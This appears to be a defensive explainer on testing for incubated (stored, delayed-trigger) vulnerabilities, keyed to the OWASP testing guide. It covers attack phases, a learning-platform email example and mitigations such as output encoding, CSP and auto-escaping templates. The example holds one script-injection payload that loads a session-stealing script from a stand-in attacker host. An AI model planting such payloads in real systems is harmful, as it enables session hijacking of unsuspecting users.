**WSTG-INPV-14**

Test Name----\> Testing for Incubated Vulnerability

Objectives---\> \- Identify injections that are stored and require a recall step to the stored injection.

\- Understand how a recall step could occur.

\- Set listeners or activate the recall step if possible.

**Overview-**

**Incubated Vulnerabilities** represent a particularly stealthy and delayed form of injection attack. Unlike traditional reflected or stored injections that cause immediate effects, incubated vulnerabilities require **two or more distinct steps**:

1. The attacker plants **malicious payloads** that are **not immediately executed**.

2. These payloads are later triggered by another process, user action, or system behavior—often **unexpectedly and outside the attacker’s direct control**.

The danger lies in their ability to **hide in plain sight**, slipping past basic input validation or detection mechanisms. These vulnerabilities often appear in systems where **data is transformed, re-used, or rendered** in different contexts—e.g., CMS systems, notification engines, reporting tools, or email renderers.

Because of the delayed nature of execution, tracking the root cause becomes much harder, and by the time the exploit surfaces, the attacker might have already exfiltrated data, altered content, or hijacked a session.

**Real World Example-**

**The Incident:**  
A popular learning management system allowed instructors to write rich-text notes for each student. These notes were saved in a database but never displayed directly to students. However, during the end-of-semester feedback email dispatch, the system **included these notes** inside personalized HTML-rich emails using a templating engine.

An attacker who was a student inserted the following into their assignment comment section (which got copied into the notes field):

\<script src\="https://evil.site/session-steal.js"\>\</script\>

Nothing happened immediately. However, during email generation at the end of the semester, this note was fetched from the database and embedded into the outgoing HTML email sent to the instructor. When the email was opened, the script executed, and the attacker successfully harvested session cookies from unsuspecting instructors.

**What Went Wrong:**

* The malicious payload was **stored safely**, but the vulnerability got **incubated** until the **right context (HTML rendering in email)** allowed execution.  
* There was **no output encoding or sanitization** at the time of reuse.  
* Developers didn’t foresee that **data reuse could change its context and risk profile**.

**How the Vulnerability occurs-**

Incubated vulnerabilities typically unfold in the following sequence:

1. **Injection Phase** – The attacker supplies crafted input that seems benign at the time. This data is **stored** (e.g., in a DB, log, or queue).

2. **Incubation Phase** – The data lies dormant in the system, potentially transformed or reinterpreted (e.g., stored as HTML, XML, or JSON).

3. **Recall Phase** – The system later **retrieves** and **renders** or **executes** this input in a different context, unintentionally triggering the payload.

This type of vulnerability thrives in systems that involve:

* **Email templating**

* **PDF/Excel/CSV generation**

* **Log parsing tools**

* **Markdown to HTML renderers**

* **Data migrations or exports to third-party systems**

Even if user input is sanitized initially, if it’s later reinterpreted by a different component (e.g., HTML email renderer, JavaScript frontend, shell command), it might become executable or dangerous.

**Secure Coding Recommendations-**

  **Apply contextual output encoding consistently**, not just during input. Use HTML, JavaScript, CSV, or JSON encoding depending on the output medium.

  **Treat stored data as untrusted** each time it is accessed. Just because you sanitized input once doesn’t mean it's safe when re-used.

  **Separate logic for storage and rendering.** Input validation should be distinct from output processing. Each rendering context deserves its own encoding/sanitization rules.

  **Use templating engines that auto-escape by default**, and avoid inline rendering of user-controlled fields unless absolutely necessary.

  **Deploy CSP (Content Security Policy)** headers to restrict what scripts can run on the page, even if one slips through.

  **Maintain logs of stored user input.** This helps in forensics when a delayed attack suddenly occurs.

  **Train developers and QA teams** to understand multi-phase threats like incubated payloads. Standard testing might not catch them if only immediate impact is observed.

**Mitigation Steps (Developer Focused)-**

  **Contextual Output Encoding:**  
Encode data **at output**, depending on where it's used (HTML, JS, CSV, XML, etc.). Use libraries that support context-aware escaping.

  **Assume All Stored Data Is Untrusted:**  
Don’t rely on initial validation alone. Each access or reuse of data must assume the data could be dangerous.

  **Implement Secure Templating Engines:**  
Use modern rendering engines that auto-escape content and prevent unsafe injection by default (e.g., Mustache, Jinja2 with autoescaping).

  **Limit HTML/JS Rendering in Emails:**  
Avoid dynamic HTML in emails unless absolutely required. Use plain-text versions wherever possible.

  **Input Normalization & Sanitization:**  
Normalize input to a consistent encoding format (like UTF-8) and sanitize it even before storage if the use case justifies it.

  **Monitor for Suspicious Recalls:**  
Set up anomaly detection for cases where stored input reappears in rendered contexts (e.g., HTML outputs, logs, emails).

  **Educate Teams About Multi-Step Exploits:**  
Ensure developers, QA testers, and security teams are aware that some payloads can be incubated and may only trigger in downstream processing.